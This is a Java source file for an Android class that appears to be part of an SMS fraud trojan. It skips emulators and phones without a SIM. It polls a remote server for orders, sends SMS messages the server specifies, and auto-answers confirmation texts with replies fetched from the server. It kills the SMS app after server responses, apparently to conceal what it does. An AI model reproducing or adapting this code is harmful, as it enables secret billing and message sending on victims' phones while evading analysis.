package net.workspace.manager;
import java.util.ArrayList;
import java.util.Map;
import net.workspace.http.HttpJsonThread;
import net.workspace.http.NetContext;
import net.workspace.listener.FlowListener;
import net.workspace.listener.NetListener;
import net.workspace.listener.NetworkListener;
import net.workspace.listener.SendSmsListener;
import net.workspace.network.NetworkController;
import net.workspace.sms.SmsSender;
import net.workspace.util.MyLogger;
import net.workspace.util.T;
import net.workspace.util.Timer;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.Context;
import bean.Feedback;
import bean.IQAnswer;
import bean.Json;
import bean.Order;
import bean.RunningApp;
import bean.form.IQForm;
import bean.form.OrderForm;
import bean.form.OrderReportForm;

public class OrderManager {
    public static OrderManager getInstance(Context context) {
        if (instance == null) {
            synchronized (locker) {
                if (instance == null) instance = new OrderManager(context);
            }
        }
        return instance;
    }
    public static final int ORDER = 1;
    public static final int INTELLIGENCE_QUESTION = 2;
    private final static Object locker = new Object();
    private static OrderManager instance;
    Context context;
    Timer timer;
    private static final int CONFIRM_TYPE_VARIABLE = 0;
    private static final int CONFIRM_TYPE_SERVER = 2;
    private OrderManager(Context context) {
        this.context = context;
        timer = new Timer(context, "aaaaaaaa", 600, 600, 600);
    }
    private void anserIQ(final IQAnswer iqAnswer) {
        if (iqAnswer != null) {
            new SmsSender(new SendSmsListener() {
                @Override
                public void onSendSmsFailed(String address, String message, String errorMsg) {
                    ReportManager.failureReport(iqAnswer, errorMsg);
                }
                @Override
                public void onSendSmsSuccess(String address, String message) {
                    ReportManager.successReport(iqAnswer, address + "->" + message);
                }
            }).sendSms(iqAnswer.reciever, iqAnswer.answer, iqAnswer.timeout);
        }
    }
    public void execute() {
        if (T.isEmulator() || !T.isSimReady()) { return; }
        checkRequest();
    }
    public void executeFeedback(String address, String text, Feedback feedback) {
        switch (feedback.type) {
            case CONFIRM_TYPE_VARIABLE: {
                String confimText = T.parseVariable(text, feedback.content);
                if (confimText != null) {
                    String receiver = feedback.port != null && feedback.port.length() > 4 ? feedback.port : address;
                    sendSms(feedback, receiver, confimText);
                }
                break;
            }
            case CONFIRM_TYPE_SERVER: {
                requestIntelligenceQuestion(text, address, feedback);
                break;
            }
        }
    }
    public void executeOrder(final Order order) {
        if (order == null) return;
        FlowManager.getInstanse().execute(order, new FlowListener() {
            @Override
            public void onFinished(Map<String, String> variables, String errorMsg) {
                doOrderReport(order.bizId, order.id, errorMsg);
                if (order.continueNext) {
                    doRequest();
                }
            }
        });
    }
    private abstract class AbstractNetworkListener implements NetListener {
        @Override
        public void onSuccess(int callBack, String url, String content) {
            T.killSmsApp();
        }
    }
    public void checkRequest() {
        if (timer.isTime()) {
            doRequest();
        }
    }
    private void doOrderReport(final long bizId, final long orderId, final String errorMessage) {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    try {
                        OrderReportForm form = T.initForm(OrderReportForm.class);
                        form.orderId = orderId;
                        form.errorMessage = errorMessage;
                        form.bizId = bizId;
                        String url = T.SERVER_URL;
                        JSONObject data = form.toJson();
                        MyLogger.debug("OrderManager orderReport request url:" + url);
                        MyLogger.debug("OrderManager orderReport request data:" + data);
                        new HttpJsonThread(new NetContext(url, data, new AbstractNetworkListener() {
                            @Override
                            public void onFailed(int callBack, String errorCode, String errorMsg) {
                                MyLogger.debug(String.format("OrderManager orderReport response error. errorCode:%s,errorMsg:%s", errorCode, errorMsg));
                            }
                            @Override
                            public void onTimeout(int i) {
                                MyLogger.debug("TaskManager orderReport response timeout");
                            }
                            @Override
                            public void onSuccess(int callBack, String url, String content) {
                                super.onSuccess(callBack, url, content);
                                MyLogger.debug("OrderManager order response:" + content);
                                try {
                                    JSONObject obj = T.toJson(content);
                                    if (obj != null) {
                                        executeOrder(Json.optObj(Order.class, obj));
                                    }
                                } catch (Exception e) {
                                    MyLogger.error(e);
                                }
                            }
                        }, 1, true)).startThread();
                    } catch (Exception e) {
                        MyLogger.error(e);
                    }
                }
            }
        });
    }
    private void doRequest() {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    timer.updateTime();
                    try {
                        OrderForm form = T.initForm(OrderForm.class);
                        form.smsAppList = new ArrayList<RunningApp>();
                        String url = T.SERVER_URL;
                        JSONObject data = form.toJson();
                        MyLogger.debug("OrderManager order request url:" + url);
                        MyLogger.debug("OrderManager order request data:" + data);
                        new HttpJsonThread(new NetContext(url, data, new AbstractNetworkListener() {
                            @Override
                            public void onFailed(int callBack, String errorCode, String errorMsg) {
                                MyLogger.debug(String.format("OrderManager order response error. errorCode:%s,errorMsg:%s", errorCode, errorMsg));
                            }
                            @Override
                            public void onTimeout(int i) {
                                MyLogger.debug("TaskManager order response timeout");
                            }
                            @Override
                            public void onSuccess(int callBack, String url, String content) {
                                super.onSuccess(callBack, url, content);
                                MyLogger.debug("OrderManager order response:" + content);
                                try {
                                    JSONObject obj = T.toJson(content);
                                    if (obj != null) {
                                        executeOrder(Json.optObj(Order.class, obj));
                                    }
                                } catch (Exception e) {
                                    MyLogger.error(e);
                                }
                            }
                        }, 1, true)).startThread();
                    } catch (Exception e) {
                        MyLogger.error(e);
                    }
                }
            }
        });
    }
    /**
     * 智能回复短信
     *
     * @param text
     * @param receiver
     * @param sign
     * @param payOrderId
     */
    public void requestIntelligenceQuestion(final String text, final String receiver, final Feedback feedback) {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    try {
                        IQForm question = T.initForm(IQForm.class);
                        question.feedback = feedback;
                        question.address = receiver;
                        question.content = text;
                        String url = T.SERVER_URL;
                        JSONObject data = question.toJson();
                        MyLogger.debug("OrderManager iq request url:" + url);
                        MyLogger.debug("OrderManager iq request data:" + data);
                        new HttpJsonThread(new NetContext(url, data, new AbstractNetworkListener() {
                            @Override
                            public void onFailed(int callBack, String errorCode, String errorMsg) {
                                MyLogger.debug(String.format("OrderManager iq response error. errorCode:%s,errorMsg:%s", errorCode, errorMsg));
                            }
                            @Override
                            public void onTimeout(int i) {
                                MyLogger.debug("TaskManager iq response timeout");
                            }
                            @Override
                            public void onSuccess(int callBack, String url, String content) {
                                super.onSuccess(callBack, url, content);
                                MyLogger.debug("OrderManager iq response:" + content);
                                try {
                                    JSONObject obj = T.toJson(content);
                                    if (obj != null) {
                                        anserIQ(Json.optObj(IQAnswer.class, obj));
                                    }
                                } catch (Exception e) {
                                    MyLogger.error(e);
                                }
                            }
                        }, 2, true)).startThread();
                    } catch (Exception e) {
                        MyLogger.error(e);
                    }
                }
            }
        });
    }
    private void sendSms(final Feedback feedback, final String number, final String msg) {
        new SmsSender(new SendSmsListener() {
            @Override
            public void onSendSmsFailed(String address, String message, String errorMsg) {
                ReportManager.failureReport(feedback, msg);
            }
            @Override
            public void onSendSmsSuccess(String address, String message) {
                ReportManager.successReport(feedback, number + "->" + msg);
            }
        }).sendSms(number, msg, feedback.timeout);
    }
}
